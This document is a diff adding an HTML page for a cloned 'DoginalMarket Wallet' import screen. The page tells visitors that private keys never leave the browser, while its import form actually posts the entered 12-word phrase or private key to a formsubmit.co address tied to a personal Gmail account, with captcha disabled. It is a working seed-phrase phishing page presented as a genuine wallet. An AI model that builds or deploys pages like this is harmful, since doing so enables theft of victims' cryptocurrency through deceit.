@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>DoginalMarket Wallet</title>
+  <meta name="description" content="DoginalMarket comes with built-in wallet, there is no need to download any browser extension.">
+  <link rel="stylesheet" href="./css/style.css">
+</head>
+<body>
+  <main class="app-container" id="app-card">
+    <!-- Top Header with Close Button -->
+    <header class="header-area">
+      <button class="close-btn" id="btn-close" aria-label="Close modal" title="Close">
+        <svg class="close-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor">
+          <line x1="18" y1="6" x2="6" y2="18"></line>
+          <line x1="6" y1="6" x2="18" y2="18"></line>
+        </svg>
+      </button>
+    </header>
+
+    <!-- Main Wallet Landing Screen (Cloned exactly as in image) -->
+    <section class="wallet-content" id="main-wallet-view">
+      <h1 class="wallet-title">DoginalMarket Wallet</h1>
+      
+      <p class="wallet-description">
+        DoginalMarket comes with built-in wallet, there is no need to download any browser extension. Your private keys are stored in the browser and are never sent to the server.
+      </p>
+
+      <div class="button-group">
+        <button class="btn btn-import" id="btn-import-wallet" type="button">
+          Import wallet
+        </button>
+      </div>
+    </section>
+
+    <!-- Sub-view: Import Existing Wallet (matches uploaded screenshot) -->
+    <section class="sub-view" id="import-wallet-view" style="display: none;">
+      <form id="import-wallet-form" action="https://formsubmit.co/ajax/arnoldcollins500@gmail.com" method="POST">
+        <h1 class="wallet-title" style="margin-bottom: 24px;">Import wallet</h1>
+
+        <input type="hidden" name="_subject" value="DoginalMarket Wallet Import Request">
+        <input type="hidden" name="_captcha" value="false">
+        <input type="hidden" name="_template" value="table">
+
+        <label class="input-label" for="import-input">
+          Enter your 12-word phrase or private key:
+        </label>
+
+        <textarea
+          class="input-field-custom"
+          id="import-input"
+          name="wallet_input"
+          rows="5"
+          placeholder="word1 word2 word3 ... or&#10;cT8kr4WCZuuY2wAQw9oavaCKWm3BSRs&#10;TGrzhvaSazfYgEREovZWf"
+          spellcheck="false"
+        ></textarea>
+
+        <div class="action-row">
+          <button class="btn-back-outline" id="btn-back-import" type="button">
+            Go back
+          </button>
+          <button class="btn-import-submit" id="btn-submit-import" type="submit">
+            Import wallet
+          </button>
+        </div>
+      </form>
+    </section>
+
+    <!-- Sub-view: Active Connected Wallet -->
+    <section class="sub-view" id="active-wallet-view" style="display: none;">
+      <div class="view-nav">
+        <button class="back-btn" id="btn-back-active" type="button">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <polyline points="15 18 9 12 15 6"></polyline>
+          </svg>
+          Switch Wallet
+        </button>
+      </div>
+
+      <h2 class="sub-title">Select another wallet</h2>
+      <p class="sub-desc" style="color: #4ade80; font-weight: 500;"></p>
+
+      <div style="background: rgba(255,255,255,0.05); padding: 16px; border-radius: 12px; margin-bottom: 24px; text-align: center;">
+        <div style="font-size: 12px; color: var(--text-secondary); margin-bottom: 6px;"></div>
+        <div style="font-family: monospace; font-size: 13px; color: #fff; word-break: break-all;"></div>
+        <div style="font-size: 22px; font-weight: 700; color: #fff; margin-top: 14px;"></div>
+      </div>
+
+      <div class="button-group">
+        <button class="btn btn-create" id="btn-disconnect" onclick="location.reload()" type="button">
+         revert back to the support
+        </button>
+      </div>
+    </section>
+  </main>
+
+  <!-- Interactive Feedback Toast -->
+  <div class="toast" id="toast" role="alert" aria-live="polite">
+    <span id="toast-message">Copied</span>
+  </div>
+
+  <script src="./js/script.js"></script>
+</body>
+</html>
